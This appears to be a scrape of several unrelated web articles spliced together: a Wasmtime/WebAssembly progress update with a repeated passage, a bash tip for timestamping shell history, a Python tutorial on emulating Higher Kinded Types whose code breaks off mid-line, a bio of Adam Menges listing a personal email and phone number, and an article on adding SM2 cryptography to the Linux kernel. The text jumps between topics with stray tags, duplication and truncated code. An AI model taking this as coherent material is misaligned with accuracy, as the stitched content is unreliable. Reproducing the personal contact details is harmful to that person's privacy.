<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>

It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>

<p>If you work with a production environment you <strong>need</strong> to be recording
timestamps in your shell history. When shit hits the fan, knowing <strong>exactly</strong>
when you ran that deploy script or updated that database can help you resolve an
incident quicker.</p>

<p>After an outage, timestamped shell history can be used to stitch together
<a href="https://archive.is/ZHW2i#timelinea-screenplay-of-the-incident-use-the-incident-timeline-from-the-incident-management-document-to-start-filling-in-the-postmortems-timeline-then-supplement-with-other-relevant-entries-pWsQSj2">an accurate timeline of events</a>
for an incident report or postmortem.
<a href="https://archive.is/a0YTc">Your company does write these, right</a>?</p>

<p>It’s so easy to record timestamps to your shell history, there’s no excuse for
not having it. Here’s how you would configure it in Bash.</p>

<div><div><pre><code><span># .bashrc</span>
<span>export </span><span>HISTTIMEFORMAT</span><span>=</span><span>'%FT%T%z: '</span> <span>#  YYYY-MM-DDTHH:MM:SS±0000</span>
</code></pre></div></div>

<p>Easy as that!</p>

<p>It is also useful in other situations: Read a bunch of emails and forgot how
long ago you started your load test? Want to know what you were doing at 3 pm
yesterday? Just check your shell history.</p>

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let’s talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as “a place for just a single type argument”.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express “nested” types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let’s try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let’s try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really it starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don’t have to put everything into a single namespace</li>
</ul>

<p>Let’s try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we’ve achieved our goal, haven’t we? But, there’s a new problem. We have to manually list all possible cases in a function’s signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let’s see what happens for <code>Tuple</code> which is not listed in the function’s overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That’s where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There’s also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function’s type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let’s see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here’s <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let’s build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let’s say we want to apply a function to the value inside boxes and bags. Let’s use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won’t not exist during runtime. Only during type-checking.</p>

<p>Now, let’s change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Calla…</span></code></pre></div></div></div></div>

                <p>Microsoft's Adam Menges—founder at Lobe.ai and former Apple employee—on helping people build intelligence into their apps by making it simple and understandable, his unconventional education, having death present, regret avoidance, grit, and his daily routine for note-taking, file management, meditation, and much more.</p>

<p>Adam is a product designer, entrepreneur, and engineer located in San Francisco who specializes in Artificial Intelligence and visual programming languages. He spent time working for both Apple and SendGrid before starting his own company, Lobe, which was acquired in late 2018. Adam is continuing his work on making machine learning more accessible, and researching applications of the technology for video effects. You can contact Adam to find out more at <a target="_blank" href="https://adammenges.com/">adammenges.com</a>, and reach out to him at <a href="mailto:adam@adammenges.com">adam@adammenges.com</a> and <a href="tel:+17204840285">+17204840285</a>.</p>

National Secret is the abbreviation of National Commercial Encryption. The National Encryption Administration Bureau formulates algorithm standards. At the same time, it also formulates a large number of product and interface specifications and application scenarios. With the external international trade conflicts and technological blockades in recent years, the rapid development of the internal Internet, the rise of the IoT field, and the transformation of the financial field have intensified. It is particularly necessary and urgent to get rid of the excessive dependence on foreign technology and products, to build a network security environment for the industry, and to enhance the security and credibility of the industry information system in our country.</p>
<p>Cryptographic algorithms are the core technology to ensure information security, especially the most critical core areas of the banking industry that have long used internationally accepted cryptographic algorithm systems and related standards such as 3DES, SHA-1, and RSA.</p>
<p>At the end of 2010, the State Cryptography Administration announced the “elliptic curve public key cryptographic algorithm” (SM2 algorithm) independently developed by my country. In order to ensure the security of cryptographic applications in important economic systems, the State Cryptography Administration issued the “Notice on Doing a Good Job in Upgrading Public Key Cryptographic Algorithms” in 2011, which clearly requires that “starting from March 1, 2011, public The key cryptographic infrastructure electronic authentication system and key management system should use the national secret algorithm. Since July 1, 2011, the information system that is put into operation and uses public key cryptography should use the SM2 algorithm.”</p>
<p>Since 2012, the State Cryptography Administration has successively published SM2/SM3/SM4 and other cryptographic algorithm standards and their application specifications in the form of the “People’s Republic of China Password Industry Standards”. Among them, “SM” stands for “commercial secret”, which is a cryptographic technology used for commercial use that does not involve state secrets.</p>
<p>The main ones worthy of our attention are the following public algorithms:</p>

<p>SM2: Public key cryptographic algorithm standard based on elliptic curve cryptography (ECC), providing digital signature, key exchange, public key encryption, used to replace RSA/ECDSA/ECDH and other international algorithms</p>
</li>
<li>
<p>SM3: Message digest algorithm, the hash result is 256 bits, used to replace international algorithms such as MD5/SHA1/SHA256</p>
</li>
<li>
<p>SM4: Symmetric encryption algorithm, the key length and packet length are both 128 bits, mainly used in wireless LAN standards and used to replace DES/AES and other algorithms</p>
</li>
<li>
<p>National secret certificate: The national secret certificate here refers to the standard X509 format certificate using the national secret algorithm (SM2-with-SM3). The certificate uses SM3 as the hash algorithm and SM2 as the digital signature algorithm.</p>
</li>
<li>
<p>National Secret SSL: adopts the national secret algorithm, a secure transmission protocol that conforms to the national secret standard, that is, the national secret version of the SSL/TLS protocol</p>
</li>
</ul>
<p><strong>SM2 Advanced Linux Kernel Road</strong></p>
<p>At present, the Linux kernel has better support the SM3 and SM4 algorithms, which benefits from the widespread use of wireless LAN standards. However, the SM2 algorithm and the national secret certificate have not been supported for a long time, and it is impossible to establish full-stack trust and integrity verification in the kernel based on the national secret. Therefore, it has become urgent to support this system in the kernel. The whole plan is to support the SM2 algorithm and national secret certificate in the kernel, and after the internal business is first applied, it will eventually be promoted to the community.</p>
<p>After the whole process, there are many unsatisfactory things, right and record.</p>
<p>First time</p>
<p>With a plan, the next step is to consider how to implement it. Any cryptographic algorithm will first consider whether it can be transplanted from openssl. Fortunately, openssl supports SM2/3/4 very well, the implementation of the elliptic curve algorithm has been tested and mature, and the latest version also fully supports the national secret certificate. Unfortunately, the degree of coupling between the various modules of openssl is very high. To implement SM2 and national secret certificates, it is necessary to transplant the openssl architecture and infrastructure codes, including BIGNUM, ECC, X509, etc. This workload is undoubtedly huge. Even if it is realized, this approach is difficult to be accepted by the community. After repeated consideration and weighing, this “shortcut” was decisively abandoned.</p>
<p>second round</p>
<p>I found a surprising fact: there is already a basic implementation of the ellipse algorithm (crypto/ecc.c) in the kernel, why not try to do it based on this algorithm? So I started coding according to the SM2 specification, but the result is a bit regretful. This ellipse algorithm actually fails on SM2, and even the most basic dot multiplication results are wrong! Nani? The script shouldn’t be like this. So I sent an email to consult a senior developer of the algorithm, and I quickly got the following reply (sighing that there are still many kind people in the world):</p>
<blockquote>
<p>Shamir’s trick algo is probably generic, but it’s ecc_point_double_jacobian()</p>
<p>that is curve specific.</p>
<p>Algorithms are chosen that are fit curves I (and previous coders) used.</p>
<p>You need to check their properties carefully if you going to use them.</p>
<p>Some variants of used algos, that may fit other curves, are in referenced</p>
<p>papers (in comments).</p>
</blockquote>
<p>To summarize the reason: this algorithm is a highly optimized algorithm that has accurately adapted the elliptic curve parameters of NIST and ECRDSA, and is not necessarily suitable for the domestic SM2 curve parameters. It seems that this road will not work…</p>
<p>…While crying, ignore me.</p>
<p>…Wiping away the tears, looking at success or failure, life is heroic, but it’s all over again…</p>
<p>Third time</p>
<p>After repeated explorations, I found that the RSA algorithm in the kernel is implemented based on an mpi (high-precision integer) library, which comes from libgcrypt (this is the implementation of the underlying algorithm of the well-known privacy protection software GnuPG). An early version of mpi has been implemented in the kernel, which was introduced to implement RSA at that time. Now libgcrypt has a complete elliptic curve basic algorithm, so I tested the SM2 algorithm curve based on libgcrypt with the mentality of giving it a try. God bless, this surprise did not turn into a fright, and the experimental results are consistent with SM2 specifications.</p>
<p>Fourth time</p>
